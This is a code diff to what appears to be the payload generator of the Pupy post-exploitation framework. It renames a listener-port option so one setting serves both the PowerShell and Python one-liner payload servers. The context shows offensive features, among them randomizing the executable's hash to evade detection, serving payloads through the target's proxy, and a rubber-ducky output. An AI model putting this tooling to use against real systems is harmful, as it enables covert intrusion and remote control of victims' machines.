@@ -377,8 +377,8 @@ def get_parser(base_parser, config):
     parser.add_argument('-E', '--prefer-external', default=config.getboolean('gen', 'external'),
                             action='store_true', help="In case of autodetection prefer external IP")
     parser.add_argument('--no-use-proxy', action='store_true', help="Don't use the target's proxy configuration even if it is used by target (for ps1_oneliner only for now)")
-    parser.add_argument('--ps1-oneliner-listen-port', default=8080, type=int, help="Port used by ps1_oneliner listener (default: %(default)s)")
     parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
+    parser.add_argument('--oneliner-listen-port', default=8080, type=int, help="Port used by oneliner listeners ps1,py (default: %(default)s)")    
     parser.add_argument('--debug-scriptlets', action='store_true', help="don't catch scriptlets exceptions on the client for debug purposes")
     parser.add_argument('--debug', action='store_true', help="build with the debug template (the payload open a console)")
     parser.add_argument('--workdir', help='Set Workdir (Default = current workdir)')
@@ -487,7 +487,7 @@ def pupygen(args, config):
         packed_payload=pack_py_payload(get_raw_conf(conf))
         i=conf["launcher_args"].index("--host")+1
         link_ip=conf["launcher_args"][i].split(":",1)[0]
-        serve_payload(packed_payload, link_ip=link_ip)
+        serve_payload(packed_payload, link_ip=link_ip, port=args.oneliner_listen_port)
     elif args.format=="ps1":
         SPLIT_SIZE = 100000
         x64InitCode, x86InitCode, x64ConcatCode, x86ConcatCode = "", "", "", ""
@@ -524,9 +524,9 @@ def pupygen(args, config):
         from pupylib.payloads.ps1_oneliner import serve_ps1_payload
         link_ip=conf["launcher_args"][conf["launcher_args"].index("--host")+1].split(":",1)[0]
         if args.no_use_proxy == True:
-            serve_ps1_payload(conf, link_ip=link_ip, port=args.ps1_oneliner_listen_port, useTargetProxy=False)
+            serve_ps1_payload(conf, link_ip=link_ip, port=args.oneliner_listen_port, useTargetProxy=False)
         else:
-            serve_ps1_payload(conf, link_ip=link_ip, port=args.ps1_oneliner_listen_port, useTargetProxy=True)
+            serve_ps1_payload(conf, link_ip=link_ip, port=args.oneliner_listen_port, useTargetProxy=True)
     elif args.format=="rubber_ducky":
         rubber_ducky(conf).generateAllForOStarget()
     else:
